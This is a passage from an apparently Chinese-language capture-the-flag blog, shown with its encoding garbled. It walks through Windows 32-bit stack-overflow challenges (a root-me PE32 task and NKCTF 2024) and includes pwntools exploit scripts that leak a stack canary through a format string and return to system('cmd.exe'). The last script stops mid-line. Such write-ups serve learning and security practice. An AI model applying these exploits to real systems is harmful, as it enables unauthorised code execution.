<h3 id="è§£å†³è°ƒè¯•é—®é¢˜"><a href="#è§£å†³è°ƒè¯•é—®é¢˜" class="headerlink" title="è§£å†³è°ƒè¯•é—®é¢˜"></a>è§£å†³è°ƒè¯•é—®é¢˜</h3><p>åœ¨æ¼æ´åˆ©ç”¨ä¹‹å‰åº”è¯¥å…ˆè§£å†³è°ƒè¯•çš„é—®é¢˜ï¼Œå› ä¸ºç¨‹åºæ²¡æœ‰è¾“å…¥ï¼Œåªæœ‰æœ€å¼€å§‹ä¼ å…¥äº†ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°ã€‚æ²¡æœ‰è¾“å…¥èƒ½å¤Ÿé˜»å¡è¿›ç¨‹ï¼Œå¯¼è‡´è¿›ç¨‹æ‹¿åˆ°å‘½ä»¤è¡Œå‚æ•°ä¼šç«‹åˆ»è¿è¡Œç»“æŸï¼Œæ²¡æ—¶é—´é™„åŠ åˆ°è¿›ç¨‹ä¸Šè°ƒè¯•ã€‚æˆ‘é‡‡å–çš„æ–¹æ³•æ˜¯ï¼ˆæ„Ÿè§‰å¯èƒ½ <code>x32dbg</code> æä¾›äº†æ›´å¥½çš„æ–¹æ³•ï¼Ÿä½†æˆ‘ä¸äº†è§£ï¼‰<code>patch</code> æ‰é’ˆå¯¹ <code>argc</code> çš„åˆ¤æ–­ï¼Œå¹¶ä¸”å°† <code>fopen</code> å’Œ <code>manage_file</code> å‡½æ•°çš„å‚æ•°éƒ½æ”¹æˆå›ºå®šçš„å­—ç¬¦ä¸² <code>1.txt</code> ï¼ˆè¿™ä¸ªå­—ç¬¦ä¸²éœ€è¦å†™åˆ° <code>.rdata</code> æ®µï¼‰</p>
<p>é¦–å…ˆåœ¨ <code>Hex View-1</code> ç•Œé¢å°† <code>1.txt</code> å­—ç¬¦ä¸²åœ¨ <code>0x404FA0</code> å¤„ç¼–è¾‘å‡ºæ¥</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152404283.png" alt="image-20240322152404283"></p>
<p>ç„¶åä¿®æ”¹ <code>text</code> æ®µä¼ å‚çš„æ±‡ç¼–ä»£ç ï¼Œåœ¨è¿™ä¹‹å‰å…ˆç¡®å®š <code>mov eax,0x404fa0</code> çš„æœºå™¨ç </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152426641.png" alt="image-20240322152426641" style="zoom: 50%;" />



<p>ä¾ç„¶æ˜¯åœ¨ <code>Hex View-1</code> ç•Œé¢å»ç¼–è¾‘æœºå™¨ç ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆ <code>keypatch</code> ç”¨ä¸äº†ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152526621.png" alt="image-20240322152526621"></p>
<p>æ­¤æ—¶å°†æ±‡ç¼–ä»£ç ä¿®æ”¹æˆäº†ä¸‹é¢è¿™æ ·</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152413841.png" alt="image-20240322152413841" style="zoom:50%;" />



<p>è§£ææˆä¼ªä»£ç å‘ç° <code>fopen</code> å’Œ <code>manage_file</code> çš„å‚æ•°éƒ½å·²ç»å›ºå®šä¸ºäº† <code>1.txt</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322152328579.png" alt="image-20240322152328579"></p>
<p>æœ€åå°† <code>if(argc&lt;=1)</code> ä¿®æ”¹æˆ <code>if(argc&lt;=0)</code> ï¼Œåªéœ€è¦æŠŠæ±‡ç¼–ä»£ç  <code>cmp     [ebp+argc], 1</code> æ”¹æˆ <code>cmp     [ebp+argc], 0</code> å°±è¡Œ </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240322160516896.png" alt="image-20240322160516896"></p>
<p>è¿™æ ·æˆ‘ä½¿ç”¨ <code>x32dbg</code> å°±å¯ä»¥ç›´æ¥ä»å¤´è°ƒè¯•è¯¥ç¨‹åºäº†ï¼Œæƒ³çœ‹ä¸åŒè¾“å…¥å¯¼è‡´ç¨‹åºçš„çŠ¶æ€ï¼Œåªéœ€è¦è°ƒæ•´ <code>1.txt</code> æ–‡ä»¶çš„å†…å®¹å³å¯ã€‚è§£å†³äº†è°ƒè¯•é—®é¢˜ä¸‹é¢è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æº¢å‡ºæ—¶ä¼šè¦†ç›–æ‰ <code>v11</code> ï¼Œè¯¥å˜é‡é‡Œè£…çš„æ˜¯ <code>fopen</code> æ‰“å¼€ <code>1.txt</code> çš„æ–‡ä»¶æŒ‡é’ˆã€‚å¦‚æœå°†å…¶æ”¹æˆäº†åƒåœ¾æ•°æ®ï¼Œé‚£ä¹ˆè¿˜èµ°ä¸åˆ° <code>manage_file</code> è¿”å›ï¼Œ<code>fclose(v11)</code> å°±ä¼šé€ æˆå´©æºƒã€‚ </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324180212341.png" alt="image-20240324180212341" style="zoom:50%;" />



<p>å¤šæ¬¡è¿è¡Œ <code>ch73.exe</code> ç¨‹åºï¼Œå‘ç°æ‰“å°çš„æ–‡ä»¶æŒ‡é’ˆæ˜¯åŒä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥åœ°å€æ˜¯å›ºå®šçš„ï¼ˆé‡å¯ç”µè„‘çš„è¯å°±å˜äº†ï¼‰ï¼Œå› æ­¤åœ¨æº¢å‡ºçš„æ—¶å€™éœ€è¦è¿˜åŸä¸€ä¸‹æ–‡ä»¶æŒ‡é’ˆã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324180449107.png" alt="image-20240324180449107"></p>
<p>ç”¨ <code>x32dbg</code> è°ƒè¯•çš„æ—¶å€™ï¼Œç‚¹å‡»ç¬¦å·è¿™ä¸€æ ï¼Œé€‰æ‹© <code>msvcrt.dll</code> é‡Œé¢æœç´¢ <code>system</code> ã€‚å¯ä»¥æ‹¿åˆ°å…¶åœ°å€ä¸º <code>0x77013D30</code> ï¼ˆåº”è¯¥æ˜¯å› ä¸ºæ²¡å¼€ <code>ASLR</code> å¯¼è‡´ <code>dll</code> åŸºåœ°å€æ¯æ¬¡éƒ½æ˜¯å›ºå®šçš„ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181108465.png" alt="image-20240324181108465"></p>
<p>ç„¶åå­—ç¬¦ä¸² <code>cmd.exe</code> çš„è¯ï¼Œåœ¨ <code>x32dbg</code> ä¸­æœç´¢å¯èƒ½ä¼šé‡è§ <code>cmd.exe</code> å­—ç¬¦ä¸²åé¢å¹¶ä¸æ˜¯ <code>\x00</code> çš„æƒ…å†µã€‚æˆ‘æ˜¯ç”¨ <code>IDA</code> æœçš„ï¼Œ<code>cmd.exe</code> åœ¨è¿™ä¸ª <code>msvcrt.dll</code> ä¸­çš„åç§»æ˜¯ <code>0x47A4</code> ã€‚å› ä¸º <code>dll</code> åŠ è½½çš„åŸºåœ°å€æ˜¯ <code>0x76FD0000</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181745856.png" alt="image-20240324181745856"></p>
<p>åœ¨å†…å­˜çª—å£æŸ¥çœ‹ <code>0x76FD47A4</code> çš„æ•°æ®ï¼Œå‘ç°æ­¤å¤„ç¡®å®ä¸º <code>cmd.exe</code> å­—ç¬¦ä¸²</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324181932374.png" alt="image-20240324181932374"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>ç®€å•è®¡ç®—åç§»ï¼Œèƒ½å†™å‡ºå¦‚ä¸‹è„šæœ¬</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cmd_addr=<span class="number">0x76FD47A4</span></span><br><span class="line">system_addr=<span class="number">0x77013D30</span></span><br><span class="line">file_ptr=<span class="number">0x77084660</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2014</span>-<span class="number">0xc</span>)</span><br><span class="line">payload+=p32(file_ptr)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(system_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p32(cmd_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./1.txt&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(payload))</span><br></pre></td></tr></table></figure>



<p>å°† <code>payload</code> å†™å…¥æ–‡ä»¶å­˜å‚¨ï¼Œå½“æ¼æ´ç¨‹åºåŠ è½½ <code>1.txt</code> ä¸­çš„ <code>payload</code> å¹¶å°†å…¶è¯»å…¥å†…å­˜ï¼Œå°±å¯ä»¥æ‰§è¡Œ <code>system(&quot;cmd.exe&quot;)</code> ä»è€Œæ‹¿åˆ°äº† <code>shell</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324182254918.png" alt="image-20240324182254918"></p>
<h2 id="2024NKCTF-æ¥ç­¾ä¸ªåˆ°"><a href="#2024NKCTF-æ¥ç­¾ä¸ªåˆ°" class="headerlink" title="2024NKCTF_æ¥ç­¾ä¸ªåˆ°"></a>2024NKCTF_æ¥ç­¾ä¸ªåˆ°</h2><p>æ˜¨å¤©åˆšåšäº†ç¬¬ä¸€ä¸ª <code>ret2dll</code> çš„[ä¾‹é¢˜](#root-me PE32 - Stack buffer overflow avancÃ©)ï¼Œä»Šå¤©æ¯”èµ›å°±åˆé‡è§ <code>windows pwn</code> äº†ã€‚å½“æ—¶çš„ä¾‹é¢˜æ‰“çš„æœ¬åœ°ï¼Œæ‰€ä»¥å…³äºè¿œç¨‹ç¯å¢ƒçš„ä¸€äº›é—®é¢˜å°±æ²¡æœ‰è€ƒè™‘åˆ°ï¼Œé€šè¿‡è¿™ä¸ªæ¯”èµ›çš„é¢˜ç›®åˆå­¦åˆ°äº†ä¸€äº›çŸ¥è¯†ğŸ˜</p>
<h3 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h3><p>é¦–å…ˆæŸ¥çœ‹é¢˜ç›®æ˜¯ <code>32</code> ä½çš„ <code>exe</code> æ–‡ä»¶</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323202626595.png" alt="image-20240323202626595"></p>
<p>ç”¨ <code>checksec</code> çœ‹äº†ä¸€ä¸‹ä¿æŠ¤ï¼Œå‘ç° <code>GS</code> ï¼ˆä¹Ÿå°±æ˜¯ <code>linux</code> ä¸‹çš„ <code>canary</code>ï¼‰æ²¡æœ‰å¼€å¯ï¼ˆä½†å®é™…ä¸Šæ˜¯å¼€å¯äº†ï¼Œè¿™é‡Œæ²¡æœ‰æ£€æµ‹å‡ºæ¥ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323202218137.png" alt="image-20240323202218137" style="zoom: 67%;" />



<h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p><code>OH</code> å‡½æ•°ä¸­å®ç°äº†ä¸»è¦é€»è¾‘ï¼Œä¸¤æ¬¡ <code>gets</code> å‡½æ•°ï¼Œç¬¬ä¸€æ¬¡ä¸»è¦æ˜¯æ¥è¾“å…¥æ•°æ®ï¼Œé…åˆç€ <code>printf</code> å‡½æ•°å­˜åœ¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å®ç°ä»»æ„åœ°å€æ³„éœ²çš„ç›®çš„ï¼Œæ¥ç€å†ä¸€æ¬¡ <code>gets</code> å‡½æ•°è¿›è¡Œæ ˆæº¢å‡ºæ¼æ´çš„åˆ©ç”¨ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323203127182.png" alt="image-20240323203127182"></p>
<p>è§‚å¯Ÿæ±‡ç¼–ä»£ç å¾ˆæ˜æ˜¾èƒ½çœ‹å‡ºæ¥æ˜¯æœ‰ <code>GS</code> ä¿æŠ¤çš„ï¼Œå› æ­¤ä¸Šé¢æåˆ°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¿˜å¾—æ³„éœ²å‡º <code>canary</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323203607041.png" alt="image-20240323203607041" style="zoom: 67%;" />



<h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>ä½œä¸ºåˆšæ¥è§¦ <code>windows pwn</code> çš„åˆå­¦è€…ï¼Œæˆ‘çš„åšé¢˜æ€è·¯æ˜¯è¿™æ ·ï¼š</p>
<ol>
<li>æŠŠç¨‹åºæ”¾åˆ°è™šæ‹Ÿæœºé‡Œé¢åï¼Œç”¨ <code>win_server</code> æŠŠç¨‹åºå½±å“åˆ°æŸä¸ªç«¯å£ä¸Šï¼Œç„¶ååœ¨å®¿ä¸»æœºé‡Œé¢å†™è„šæœ¬ï¼ˆç”¨ <code>remote</code> å»å’Œè™šæ‹Ÿæœºé‡Œçš„ç¨‹åºäº¤äº’ï¼‰ï¼Œå› ä¸ºç¨‹åºæœ¬èº«çš„è¾“å…¥å°±å¯ä»¥é˜»å¡è¿›ç¨‹ï¼Œæ–¹ä¾¿ç”¨ <code>x32dbg</code> ç›´æ¥é™„åŠ åˆ°è¿›ç¨‹ä¸Šè°ƒè¯•ã€‚</li>
<li>åˆšå¼€å§‹åªè€ƒè™‘å…ˆæ‰“é€šæœ¬åœ°ï¼Œæ‰€ä»¥è¿˜ç”¨ä¸åˆ°é¢˜ç›®ç»™å‡ºçš„ <code>dll</code> æ–‡ä»¶ã€‚å¯¹äºæœ¬é¢˜è€Œè¨€ï¼Œè°ƒè¯•çš„æ—¶å€™å…³æ³¨ä¸‰ä¸ªç‚¹ï¼Œé¦–å…ˆæ˜¯ <code>canary</code> çš„ä½ç½®ï¼Œå°±æ˜¯ç¬¬ä¸€æ¬¡è¾“å…¥å¤§é‡çš„ <code>%p-%p-%p-%p</code> å­—ç¬¦ä¸²ï¼Œæˆ‘è¦èƒ½ç¡®è®¤å‡ºå“ªä¸ªæ˜¯ <code>canary</code> å¹¶è¿›è¡Œæ¥æ”¶ï¼›å…¶æ¬¡æ˜¯æº¢å‡ºçš„åç§»é‡ä¹Ÿè¦è®¡ç®—å‡ºæ¥ï¼›æœ€ååœ¨ <code>x32dbg</code> çš„è°ƒè¯•ç•Œé¢æŸ¥çœ‹ä¸€ä¸‹ <code>msvcrt.dll</code> çš„åŸºåœ°å€ï¼ˆå› ä¸ºç›®å‰åšé¢˜å¾ˆå°‘ï¼Œåº”è¯¥æ˜¯åªè¦æ²¡å¼€ <code>ASLR</code> çš„ <code>dll</code> åŸºåœ°å€éƒ½æ˜¯å›ºå®šçš„ï¼Ÿï¼‰ï¼Œé¡ºä¾¿ç¡®ä¿å¤šæ¬¡è¿è¡Œç¨‹åºï¼Œ <code>msvcrt.dll</code> çš„åŸºåœ°å€æ˜¯å›ºå®šçš„ã€‚</li>
<li>æœ‰ä¸¤æ¬¡è¾“å…¥ï¼Œåœ¨è„šæœ¬é‡Œåªç¼–å†™ä¸€æ¬¡ <code>sendline</code> å‡½æ•°ï¼Œè¿™æ ·å°±ä¼šè®©è¿›ç¨‹é˜»å¡</li>
</ol>
<h3 id="è°ƒè¯•-amp-amp-æ‰“é€šæœ¬åœ°"><a href="#è°ƒè¯•-amp-amp-æ‰“é€šæœ¬åœ°" class="headerlink" title="è°ƒè¯•&amp;&amp;æ‰“é€šæœ¬åœ°"></a>è°ƒè¯•&amp;&amp;æ‰“é€šæœ¬åœ°</h3><p>æˆ‘å°†æ–­ç‚¹ä¸‹åˆ°äº† <code>0x4014DF</code> å¤„ï¼Œåœ¨ç»™äºˆç¬¬äºŒæ¬¡è¾“å…¥åç¨‹åºå°±å¯ä»¥è¿è¡Œåˆ°æ­¤å¤„ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323210310637.png" alt="image-20240323210310637"></p>
<p>æ­¤æ—¶çš„ä»£ç æ˜¯è¦åˆ¤æ–­ <code>canary</code> æ˜¯å¦è¢«ç ´åï¼Œå–äº†æ ˆé‡Œçš„ <code>ebp-0xc</code> çš„å€¼åšæ¯”è¾ƒï¼Œé‚£è¯´æ˜ <code>0x61FF0C</code> ä¸­å­˜æ”¾çš„å°±æ˜¯ <code>canary</code> ã€‚è¾“å…¥å¤§é‡çš„ <code>%p</code> å°±å¯ä»¥æˆåŠŸå°† <code>canary</code> æ³„éœ²å‡ºæ¥ã€‚è‡³äºæº¢å‡ºåç§»é‡çš„è®¡ç®—æ˜¯å¸¸è§„æ“ä½œï¼Œè¿™é‡Œä¸å†æåŠã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323210543053.png" alt="image-20240323210543053"></p>
<p>ç‚¹å‡» <strong>ç¬¦å·</strong> è¿™ä¸€æ ï¼Œå¯ä»¥çœ‹åˆ° <code>msvcrt.dll</code> çš„åŸºåœ°å€æ˜¯ <code>0x76860000</code> ï¼ˆå¤šæ¬¡è¿è¡Œå‘ç°ä¸€ç›´å›ºå®šï¼‰ï¼Œåœ¨å³ä¾§å¯ä»¥æœç´¢ <code>system</code> å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°åœ°å€æ˜¯ <code>0x768A3D30</code> ã€‚ä¹Ÿå°±æ˜¯è¯´ <code>system</code> å‡½æ•°åœ¨è¯¥ <code>dll</code> é‡Œçš„åç§»é‡ä¸º <code>0x43D30</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323211605343.png" alt="image-20240323211605343"></p>
<p>ä½†æ˜¯æˆ‘æŠŠè¯¥ <code>dll</code> æ‹–åˆ°äº† <code>IDA</code> ä¸­ï¼ŒæŸ¥çœ‹ <code>system</code> åœ°å€ä¸º <code>0x10143D30</code> ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323230837806.png" alt="image-20240323230837806"></p>
<p>ç„¶åå‘ç° <code>text</code> æ®µçš„é¦–åœ°å€ä¸º <code>0x10101000</code> ï¼ŒäºŒè€…ç›¸å‡ï¼Œå¾—åˆ° <code>system</code> å‡½æ•°åœ¨ <code>dll</code> ä¸­çš„åç§»ä¸º <code>0x42D30</code> ã€‚å’Œä¸Šé¢åœ¨ <code>x32dbg</code> ä¸­æ±‚å‡ºçš„ <code>0x43D30</code> åç§»ä¸åŒï¼ˆç›®å‰åŸå› æœªçŸ¥ï¼Œä¸è¿‡è‚¯å®šè¦ä»¥ <code>x32dbg</code> ä¸Šçš„ä¸ºå‡†ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323231258275.png" alt="image-20240323231258275"></p>
<p>åŒç†ï¼Œåœ¨ <code>dll</code> ä¸­æ‰¾åˆ°å­—ç¬¦ä¸² <code>cmd.exe</code> çš„åœ°å€ï¼ˆç”¨åŸºåœ°å€åŠ ä¸Šå…¶åç§»å³å¯ï¼Œå› ä¸º <code>dll</code> ä¸­åœ°å€å›ºå®šï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ <code>x32dbg</code> é‡Œå»æœç´¢å…¶ <code>system</code> å’Œæ‰€éœ€å‚æ•°å›ºå®šçš„åœ°å€ï¼‰ï¼Œæ­¤æ—¶å¯ä»¥å†™å‡ºå¦‚ä¸‹ <code>exp</code></p>
<p>æ•´ä¸ªçš„æ€è·¯å¾ˆå¸¸è§„ï¼Œè¦æçš„ä¸¤ç‚¹åˆ†åˆ«æ˜¯æ¥æ”¶ <code>canary</code> å¯ä»¥åœ¨å‰é¢å‘é€å‡ ä¸ªå­—ç¬¦ <code>a</code> ï¼Œç„¶åç”¨ <code>recvuntil</code> å‡½æ•°è¯»å– <code>a</code> ä¹‹åï¼Œå†å»æ¥æ”¶ <code>canary</code> ä¼šå¾ˆå‡†ç¡®ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆæ— æ³•ç”¨ <code>%3$p</code> è¿™æ ·çš„æ ¼å¼åŒ–å­—ç¬¦æ¥ç²¾å‡†æ³„éœ²æ•°æ®ï¼‰ã€‚å¦å¤–å°±æ˜¯ <code>sleep</code> æ˜¯ä¸ºäº†æä¾›ä¸€ä¸ªè¶³å¤Ÿçš„æ—¶é—´ï¼Œè®©æˆ‘æ¥å¾—åŠæ‰‹åŠ¨é™„åŠ åˆ°è¿›ç¨‹ä¸Šå»è°ƒè¯•ã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.110.131&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">payload=<span class="string">&#x27;%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaa%p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;NKCTF2024&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary==&gt;&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">system_addr=<span class="number">0x768a3d30</span></span><br><span class="line">cmd_addr=<span class="number">0x768647a4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x64</span>+p32(canary)+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)+p32(<span class="number">0x11223344</span>)+p32(cmd_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å·²ç»æ‹¿åˆ°äº†æœ¬åœ°çš„ <code>shell</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323233759018.png" alt="image-20240323233759018"></p>
<h3 id="æ”»å‡»è¿œç¨‹"><a href="#æ”»å‡»è¿œç¨‹" class="headerlink" title="æ”»å‡»è¿œç¨‹"></a>æ”»å‡»è¿œç¨‹</h3><p>æ¥ä¸‹æ¥æ ¹æ® <code>dll</code> åŸºåœ°å€è°ƒæ•´ <code>exp</code> ä»è€Œæ”»å‡»è¿œç¨‹ï¼Œç»è¿‡æµ‹è¯•æˆ‘å‘ç°åç§» <code>4</code> çš„ä½ç½®ç–‘ä¼¼æ˜¯ <code>msvcrt.dll</code> ä¸­çš„åœ°å€ï¼Œå¹¶ä¸”åœ°å€æœªéšæœºã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323234328781.png" alt="image-20240323234328781"></p>
<p>ä¸ºä»€ä¹ˆä¼šçŒœæµ‹è¿œç¨‹ç¯å¢ƒä¸­åç§» <code>4</code> çš„ä½ç½®å°±æ˜¯ <code>msvcrt.dll</code> ä¸­çš„åœ°å€å‘¢ï¼Ÿå› ä¸ºæˆ‘åœ¨è°ƒè¯•æœ¬åœ°æ—¶ï¼Œå‘ç°äº†è¿™ä¸ªä½ç½®ï¼ˆåç§» <code>4</code>ï¼‰å­˜æ”¾äº†ä¸€ä¸ª <code>msvcrt.dll</code> ä¸­çš„åœ°å€</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323234604692.png" alt="image-20240323234604692"></p>
<p>æˆ‘ä¸çŸ¥é“å¦‚ä½•æ›´æ¢ <code>dll</code> ï¼Œæˆ‘çœ‹ç½‘ä¸Šæœ‰å¸ˆå‚…æŠŠ <code>C:\windows\SysWoW64\</code> ç›®å½•ä¸‹é¢çš„ <code>msvcrt.dll</code> æ”¹ä¸ªåå­—ï¼Œç„¶åå°†é¢˜ç›®ç»™çš„ <code>msvcrt.dll</code> æ‹·è´è¿›å»ã€‚æˆ‘æ“ä½œäº†ä¹‹åï¼Œå‘ç°è¿˜æ˜¯æ²¡æœ‰æ›´æ¢æˆåŠŸï¼Œäºæ˜¯é‡å¯ç³»ç»Ÿï¼Œæ¥ç€å°±å¼€å§‹ç–¯ç‹‚æŠ¥é”™ï¼Œæ‰€æœ‰çš„å¯æ‰§è¡Œæ–‡ä»¶éƒ½æ‰“ä¸å¼€äº†ã€‚äºæ˜¯åªèƒ½å°è¯•å…¶ä»–æ€è·¯ã€‚</p>
<p>æˆ‘å…ˆæ˜¯æŸ¥çœ‹äº†æœ¬åœ°åç§» <code>4</code> çš„é‚£ä¸ªåœ°å€ï¼Œå…¶å®é™…åœ¨ <code>dll</code> ä¸­çš„åç§»ä¸º <code>0x7A19B</code> ï¼Œè¿™é‡Œçš„ä½ç½®æ˜¯ <code>setvbuf+0x10B</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235442691.png" alt="image-20240323235442691" style="zoom:67%;" />



<p>å› ä¸ºä¸Šé¢æ˜¯çœ‹çš„æœ¬åœ°çš„åœ°å€ï¼Œæ‰€ä»¥ <code>dll</code> ä¹Ÿæ˜¯ç”¨ç³»ç»Ÿæœ¬èº«çš„ã€‚æ¥ä¸‹æ¥æˆ‘åˆçœ‹äº†ä¸€ä¸‹è¿œç¨‹æ³„éœ²çš„åœ°å€ <code>0x76D6BDFB</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235602941.png" alt="image-20240323235602941"></p>
<p>ç„¶åæˆ‘æŸ¥çœ‹äº†é¢˜ç›®ç»™çš„ <code>dll</code> ï¼Œæˆ‘å…ˆå®šä½åˆ°äº† <code>setvbuf</code> å‡½æ•°ï¼Œä¹Ÿå»æ‰¾åˆ° <code>setvbuf+0x10B</code> çš„ä½ç½®ï¼Œå‘ç°åœ°å€æ˜¯ <code>0x1017BDFB</code> ã€‚æ­¤æ—¶æ„è¯†åˆ°è¿™ä¸ªåœ°å€çš„æœ€åå‡ ä¸ªå­—èŠ‚å’Œè¿œç¨‹æ³„éœ²çš„åœ°å€æœ«å°¾å‡ ä¸ªå­—èŠ‚ä¸€æ ·ã€‚æ ¹æ®ä¸Šé¢æœ¬åœ°ç”¨ <code>IDA</code> æŸ¥çœ‹åç§»çš„ç»éªŒï¼Œè¿™ä¸ª <code>setvbuf+0x10B</code> çš„ä½ç½®å®é™…åœ¨ <code>dll</code> é‡Œçš„åç§»åº”è¯¥æ˜¯ <code>0x7BDFB</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240323235844469.png" alt="image-20240323235844469"></p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>ä¸Šé¢çš„åªèƒ½ç®—çŒœæµ‹ï¼Œä½†æŒ‰ç…§è¿™æ ·æ¥çŒœï¼Œæˆ‘ç¡®å®å¯ä»¥å¾—åˆ°è¿œç¨‹ç¯å¢ƒ <code>dll</code> çš„åŸºåœ°å€ï¼Œç„¶åå°† <code>system</code> å‡½æ•°å’Œ <code>cmd.exe</code> å­—ç¬¦ä¸²åç§»æ¢æˆé¢˜ç›®ç»™çš„ <code>dll</code> é‡Œçš„å€¼ï¼Œå¯ä»¥å†™å‡º <code>exp</code> å¦‚ä¸‹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;123.60.25.223&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">payload=<span class="string">&#x27;%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaa%p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;NKCTF2024&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span 